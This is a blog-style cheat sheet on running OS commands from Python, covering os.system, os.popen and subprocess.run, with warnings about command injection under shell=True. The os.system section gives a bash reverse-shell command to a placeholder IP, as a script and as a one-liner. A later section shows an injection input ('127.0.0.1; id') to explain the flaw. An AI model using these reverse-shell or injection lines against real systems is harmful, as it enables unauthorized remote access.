---
layout: post
title: OS Commands with Python
date: 2023-09-01 14:46 -0400
categories: [Python]
tags: [cheat sheet, python, boilerplate, os, command injection]
---

First of all, I'm going to open this entire post by saying that this is for _prototyping only_. If you can use a python function or python module that has been built and tested properly rather than use python to call another binary or generally execute some sort of shell script code, you should _always_ do that. However, if you are just using python to get something done that you **don't intend to move into a production environment**, then read on I guess. I wanted to write this so I had a means of looking back on my work and know all the "gotchas" rather than have to look this up all the time.

Again, I really have to stress that calling binaries or shell commands from within a python script runs you the risk of potentially being vulnerable to a command injection attack. Sure there are proper ways to do it, but you may not want to run that risk, especially if you intend for others to use your code or to automate a task that has no (or little) sense of accountability.

Just food for thought.

## Anyway, OS Commands with Python

In the event that you need to execute some arbitrary OS command from your python script, there are several ways to go about doing it. You can use `os.system()`, `os.popen()`, `subprocess.run()`, and `subprocess.Popen()`, among others that aren't worth mentioning.

### os Module

The `os` module is useful if you have access to a python command environment and want to execute something without caring of the output, most likely because you are kicking back a reverse shell. This one is a particular favorite of mine:

#### os.system

```python
import os
c = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.20.30.40/9090 0>&1'"
os.system(c)
```

Or a little one liner:

```terminal
$ python -c "import os;os.system('/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.20.30.40/9090 0>&1\"')"
```

#### os.popen

This is similar to the `system` function, but instead of echoing the output to STDOUT of the calling shell, this will read the output as if it were a file handler (more specifically `os._wrap_close`, but it has access to an IO stream so `read()` will work with it), so you should treat it as such in python.

```python
import os

c = "ping -c 1 50.60.70.80"
out = os.popen(c)

print(out.read())
```

Also to be fancy:

```python
import os

with os.popen("ping -c 1 50.60.70.80") as o:
    out = o.read()

print(out)
```

## The Recommended Way: subprocess

I won't bother getting into some of the legacy methods, but as of this writing the "preferred" method is to use `subprocess.run()`.

```python
import subprocess

# Note it's better to separate arguments into separate objects. This is the lazy way:
cmd = "ping -c 1 50.60.70.80".split(" ")

# But this is probably better in case you have files with spaces in their names or something:
cmd = ["ping", "-c", "1", "50.60.70.80"]

out = subprocess.run(cmd, capture_output=True)

print(out.stdout.decode("utf-8"))
```
> Note, adding `capture_output=True` will suppress output from being displayed the instan that `subprocess.run()` is executed. Instead, you can access STDOUT and STDERR from the new object created in the `out` variable.
{: .prompt-info}

### shell=True

If you specify `shell=True`, `subprocess.run()` will execute the code from inside of a new shell, and shell functions and methods will be availble to the command, such as pipes and output redirection. Unfortunately this comes with an even greater risk, as you can pass a full string to this command and it will simply hand it off to bash (or whatever shell you have configured) and it will execute from within the context of a shell. This makes the command _a lot more command-injectable!_ Especially if you are creating a string to pass to this function by way of the result of user input. Take the code:

```python
import subprocess
import sys

ip = sys.argv[1]
cmd = f"ping -c 1 {ip}"

out = subprocess.run(cmd, shell=True)

print(out.stdout.decode("utf-8"))
```

By providing `"127.0.0.1; id"` as the `sys.argv[1]` argument, you can execute whatever you want after the `;`. If you choose the default and set `shell=False`, then not only will it require that all commands and arguments be individual items in a list, but it will not honor things like a semicolon, double ampersand, or even sub-shell commands (like `$(id)`) to execute. It will throw an error that the name or service is not known.

### "Proper" Way of Handling Errors

This is some boilerplate code for a function that will execute the `cat` command and display a file if it exists. If it doesn't exist, it will throw an error. This may not be the most elegant, but it will get the job done. Also I'm sure some of the more prolific python devs out there will probably argue there is a better way of handling this, but this will get the job done:

```python
import subprocess

def os_read_file(thisFile: str) -> str: 
    cmd = ["/bin/cat", thisFile]
    out = subprocess.run(cmd, capture_output=True)

    if out.returncode > 0:
        raise Exception(out.stderr.decode("utf-8"))
    
    return out.stdout.decode("utf-8")


if __name__ == "__main__":
    try:
        print(os_read_file("/etc/does/not/exist"))
    except Exception as e:
        print(e)
```